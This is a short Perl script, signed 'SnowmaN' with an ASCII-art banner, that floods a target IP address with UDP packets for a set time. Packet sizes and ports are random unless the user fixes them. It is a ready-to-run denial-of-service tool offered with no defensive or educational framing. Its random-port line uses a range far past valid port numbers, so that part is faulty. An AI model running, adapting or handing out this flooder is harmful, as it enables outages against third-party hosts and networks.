#!/usr/bin/perl

##
# DgH By SnowmaN<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

  /$$$$$$  /$$                      /$$$$$$$$                         /$$$$$$                      /$$             /$$    
 /$$__  $$| $$                     |__  $$__/                        /$$__  $$                    |__/            | $$    
| $$  \__/| $$  /$$$$$$  /$$$$$$/$$$$ | $$  /$$$$$$   /$$$$$$       | $$  \__/  /$$$$$$$  /$$$$$$  /$$  /$$$$$$  /$$$$$$  
|  $$$$$$ | $$ |____  $$| $$_  $$_  $$| $$ /$$__  $$ /$$__  $$      |  $$$$$$  /$$_____/ /$$__  $$| $$ /$$__  $$|_  $$_/  
 \____  $$| $$  /$$$$$$$| $$ \ $$ \ $$| $$| $$  \ $$| $$  \ $$       \____  $$| $$      | $$  \__/| $$| $$  \ $$  | $$    
 /$$  \ $$| $$ /$$__  $$| $$ | $$ | $$| $$| $$  | $$| $$  | $$       /$$  \ $$| $$      | $$      | $$| $$  | $$  | $$ /$$
|  $$$$$$/| $$|  $$$$$$$| $$ | $$ | $$| $$|  $$$$$$/|  $$$$$$/      |  $$$$$$/|  $$$$$$$| $$      | $$| $$$$$$$/  |  $$$$/
 \______/ |__/ \_______/|__/ |__/ |__/|__/ \______/  \______/        \______/  \_______/|__/      |__/| $$____/    \___/  
                                                                                                      | $$                
                                                                                                      | $$                
                                                                                                      |__/     




 SlamToo By SlamTooPowerful, Powerful is So MoFkN sO DamN powerful some good ass power.
EOTEXT

print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Disrespected = " .
  ($size ? "$size-byte" : "Disconnected :)") . " ~SnowmaN~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}